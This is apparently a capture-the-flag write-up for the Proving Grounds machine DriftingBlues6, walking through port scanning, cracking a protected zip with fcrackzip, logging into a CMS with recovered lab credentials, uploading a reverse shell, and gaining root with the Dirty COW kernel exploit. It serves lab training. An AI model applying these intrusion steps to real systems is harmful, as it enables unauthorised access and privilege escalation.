---
title: "PG Play: DriftingBlues6"
created: "2023-09-10"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "DriftingBlues6"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - dirty-cow-kernel-exploit
  - reverse-shell
  - file-upload
  - zip-cracking
  - etcpasswd-manipulation
related:
  - "[[Kernel-Exploit-Methodology]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[Password-Cracking-Methodology]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: DriftingBlues6

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-10

---

## Quick Summary

**Open Ports:**
- 80/tcp (http)

**Key Techniques:**
- Dirty COW (Kernel Exploit)
- Reverse Shell
- File Upload
- Zip Cracking
- /etc/passwd Manipulation

**Privilege Escalation Path:**
- Dirty COW
- Kernel exploit

---

## Full Walkthrough

Proving grounds Play - DriftingBlues6 CTF writeup.

## Nmap

```sh
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: driftingblues
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
```

## Web PORT: 80


## Fuzzing for files

/robots.txt

**Robots File**

```text
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

### Login

http://192.168.151.219/textpattern/textpattern/


Zip file found at `http://192.168.151.219/spammer.zip`. File is password protected and which can be easliy cracked using `fcrackzip` tool.

```sh
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt spammer.zip
```

Extracted password: `myspace4`

Extracted `creds.txt` has login credentials for the CMS application.

```text
mayer:lionheart
```

Login to the application and upload reverse shell.


Checked the document root configuration and triggered the reverse shell file.

**Initial foothold obtained**


## Privilege Escalation

Check the kernel version to escalate privileges.

```sh
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

Linux kernel <3.2.0-4-amd64 is vulnerable to [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839).

Download the exploit into the attacking machine and compile the code as mentioned in the exploit.

Run the exploit as follow:

```sh
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password #password is the password for the user firefart created by the exploit
```

Switch user to `firefart` and use the password `password`.


**Root shell obtained**

---

## Technique Links

- [[Kernel-Exploit-Methodology]]
- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[Password-Cracking-Methodology]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
